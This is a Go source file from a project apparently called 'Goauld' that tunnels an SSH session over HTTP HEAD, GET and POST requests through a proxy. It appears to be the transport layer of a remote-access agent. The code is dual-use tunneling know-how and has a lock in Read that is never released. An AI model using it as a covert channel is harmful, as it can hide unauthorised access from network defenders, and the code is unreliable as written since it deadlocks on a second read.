package transport

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"

	"Goauld/agent/agent"
	"Goauld/agent/proxy"
	"Goauld/common/log"
)

// SSHHttpClient handle the SSH connection over the HTTP traffic
type SSHHttpClient struct {
	client *http.Client
	buffer bytes.Buffer
	bufMu  sync.Mutex
	url    string
}

// NewSSHTTPConn returns a new SSHHttpClient
func NewSSHTTPConn() *SSHHttpClient {
	httpClient := &http.Client{
		Transport: proxy.NewTransportProxy(),
	}
	return &SSHHttpClient{
		client: httpClient,
		url:    agent.Get().SSHTTPUrl(),
	}
}

// Connect initialize the SSH over HTTP connection
func (c *SSHHttpClient) Connect() error {
	log.Trace().Str("SSH Mode", "HTTP").Msgf("Connect to %s", c.url)
	r, err := c.client.Head(c.url)
	if err != nil {
		return err
	}
	if r.StatusCode != 200 {
		return errors.New("HEAD: " + r.Status)
	}
	log.Trace().Str("SSH Mode", "HTTP").Msgf("HTTP successfully connected: %s", r.Status)
	return nil
}

// Read performs a GET request to read data from the remote SSH server
// the data is then send to the local SSH client
func (c *SSHHttpClient) Read(b []byte) (int, error) {
	c.bufMu.Lock()
	if c.buffer.Len() > 0 {
		// log.Trace().Msgf("read data in buffer")
		return c.buffer.Read(b)
	}

	r, err := c.client.Get(c.url)
	if err != nil {
		return 0, err
	}
	body, err := io.ReadAll(r.Body)
	if err != nil {
		return 0, err
	}
	err = r.Body.Close()
	if err != nil {
		return 0, err
	}

	_, err = c.buffer.Write(body)
	if err != nil {
		return 0, fmt.Errorf("error writing to buffer: %v", err)
	}
	return c.buffer.Read(b)
}

// Write performs a POST request to send data from the local SSH client
// to the remote SSHD server
func (c *SSHHttpClient) Write(b []byte) (int, error) {
	// log.Trace().Msgf("WRITE START")
	// defer log.Trace().Msgf("WRITE END")
	_, err := c.client.Post(c.url, "application/octet-stream", bytes.NewReader(b))
	if err != nil {
		return 0, err
	}
	// log.Trace().Msgf("http client post response: %s", r.Status)
	return len(b), nil
}

// Close finish the connection to the server
func (c *SSHHttpClient) Close() error {
	log.Trace().Str("SSH Mode", "HTTP").Msgf("Close() called")
	return nil
}

func (c *SSHHttpClient) LocalAddr() net.Addr {
	return &net.TCPAddr{}
}

func (c *SSHHttpClient) RemoteAddr() net.Addr {
	return &net.TCPAddr{}
}

func (c *SSHHttpClient) SetDeadline(t time.Time) error {
	return nil
}

func (c *SSHHttpClient) SetReadDeadline(t time.Time) error {
	return nil
}

func (c *SSHHttpClient) SetWriteDeadline(t time.Time) error {
	return nil
}
